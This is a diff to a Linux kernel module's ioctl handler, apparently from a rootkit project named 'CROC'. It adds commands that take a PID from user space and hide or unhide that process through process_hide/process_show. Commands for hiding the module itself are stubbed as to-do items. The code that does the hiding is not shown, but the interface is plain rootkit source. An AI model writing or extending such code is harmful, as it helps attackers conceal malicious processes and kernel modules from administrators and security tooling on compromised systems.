@@ -17,27 +17,94 @@
  */
 
 #include <linux/fs.h>
+#include <linux/version.h>
 
 #include "types.h"
 #include "device/details/cdev_utils.h"
 #include "device/details/file_ops.h"
+#include "device/details/hash_tbl.h"
 #include "device/details/ioctl_cmd.h"
+#include "proc/proc.h"
 
 long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 {
     rc_t err = 0;
     rc_t retval = 0;
+    pid_t pid;
+    module_dev_t* p_dev;
 
     /*
      * extract the type and number bitfields, and don't decode
      * wrong cmds: return ENOTTY (inappropriate ioctl) before access_ok()
      */
-    if (_IOC_TYPE(cmd) != DEVICE_IOC_MAGIC) {
+    if (_IOC_TYPE(cmd) != CROC_IOC_MAGIC) {
         return -ENOTTY;
     }
-    if (_IOC_NR(cmd) > DEVICE_IOC_MAX_NR) {
+    if (_IOC_NR(cmd) > CROC_IOC_MAX_NR) {
         return -ENOTTY;
     }
+
+    /*
+     * the direction is a bitmask, and VERIFY_WRITE catches R/W
+     * transfers. `Type' is user-oriented, while
+     * access_ok is kernel-oriented, so the concept of "read" and
+     * "write" is reversed
+     */
+    if (_IOC_DIR(cmd) & _IOC_WRITE) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,0,0)
+        err = ! access_ok(VERIFY_READ, (void __user *)arg, _IOC_SIZE(cmd));
+#else
+        err = ! access_ok((void __user *)arg, _IOC_SIZE(cmd));
+#endif
+    }
+    if (err != 0) {
+        return -EFAULT;
+    }
+
+    switch(cmd) {
+    case CROC_IOC_RESET:
+        break;
+    case CROC_IOC_HIDE_PID:
+        retval = __get_user(pid, (pid_t __user*)arg);
+        if (retval != 0) {
+            return retval;
+        }
+        if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
+            return -ESRCH;  /* No such process */
+        }
+
+        p_dev = p_file->private_data;
+        if (hash_tbl_insert(&p_dev->hash_tbl, pid)) {
+            retval = process_hide(pid);
+            if (retval != 0) {
+                hash_tbl_erase(&p_dev->hash_tbl, pid);
+            }
+        }
+        break;
+    case CROC_IOC_SHOW_PID:
+        retval = __get_user(pid, (pid_t __user*)arg);
+        if (retval != 0) {
+            return retval;
+        }
+        if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
+            return -ESRCH;  /* No such process */
+        }
+
+        p_dev = p_file->private_data;
+        if (hash_tbl_erase(&p_dev->hash_tbl, pid)) {
+            retval = process_show(pid);
+        }
+        break;
+    case CROC_IOC_HIDE_MODULE:
+        /* @todo    Implement */
+        break;
+    case CROC_IOC_SHOW_MODULE:
+        /* @todo    Implement */
+        break;
+    default:
+        return -ENOTTY;
+    }
+
     return 0;
 }
 
@@ -65,6 +132,11 @@ ssize_t dev_read(struct file* p_file, char __user* p_buf, size_t count, loff_t* 
 }
 
 rc_t dev_release(struct inode* p_inode, struct file* p_file)
+{
+    return 0;
+}
+
+ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, loff_t* p_f_pos)
 {
     return 0;
 }
